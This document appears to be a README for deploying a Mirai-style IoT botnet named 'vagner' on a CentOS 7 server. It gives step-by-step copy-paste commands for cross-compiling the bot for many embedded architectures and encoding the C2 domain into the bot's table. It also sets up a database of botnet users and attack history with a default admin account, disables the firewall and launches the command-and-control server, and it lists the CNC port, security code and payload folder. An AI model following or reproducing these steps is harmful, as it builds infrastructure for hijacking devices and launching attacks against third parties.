# make sure to use centos 7 as your main botnet hosting os
# Copy paste this code and put it all on your terminal all at once: 

yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y

cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
sha256sum go1.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
source ~/.bash_profile
go version
go env
cd ~/

mkdir /etc/xcompile
cd /etc/xcompile

wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2

tar -xf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2

rm -rf *.tar.bz2
rm -rf *.tar.gz

mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l


# Domain (you need a domain on cloudflare )
``` put server ip on the cloudflare dns and make it non proxied ```
``` use the enc.c file to encode your domain // ```
``` compail the enc.c file : "gcc enc.c -o enc" ```
``` use it like that example: my domain is https://example.com >> ./enc string example.com```
``` Copy the string that enc generates and past it on /bot/table.c line: 20 and 21 ```
***    add_entry(TABLE_CNC_DOMAIN, "\x70\x77\x71\x6F\x6D\x2A\x65\x76\x69\x7D\x04", 11); // your domain goes here  ***
***    add_entry(TABLE_SCAN_DOMAIN, "\x70\x77\x71\x6F\x6D\x2A\x65\x76\x69\x7D\x04", 11); // your domain goes here ***
``` change ip on /cnc/main.go line 19 from 0.0.0.0 into your vps ip```
``` change ip on /bot/headers/includes.h line 27 from 0.0.0.0 into your vps ip```


# We will setup the database, run these commands on your terminal:

yum install mariadb-server -y
service mariadb restart

# setup mariadb password
mysql_secure_installation

# Now Login with your mysql pass by running this command:

mysql -u root -p**mypasswordhere**

# Now we will add the database, copy and paste this on your terminal:

CREATE DATABASE vagner;
use vagner;
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
INSERT INTO users VALUES (NULL, 'root', 'elite', 0, 0, 0, 0, -1, 1, 30, '');
exit;

# stting up db infos
go to /cnc/main.go and change 
`const DatabasePass string = "passwordhere"`
line 19 into your database password


# Now your database is complete, we will restart and disable services:

service iptables stop 
service httpd restart  
service mariadb restart

# Alright, we have to compile the bot and screen the cnc server by doing this:

cd ~/
chmod 777 *
sh build.sh

# Run the cnc
screen -dm ./admin

or

screen -S cnc ./admin
then click ctrl + a+d

# connecting to our botnet
download client like putty/mobaxterm/kitty/ubuntu
ex : https://putty.org/
ex on how to connect:
cmon bro you wanna create your own panel and dont know how to use putty?? alr add me on demons_arc

# cnc port
`1337`
# cnc security code
`vagner`
# bot port
`1337`
# bot folder
`/var/www/html/bins`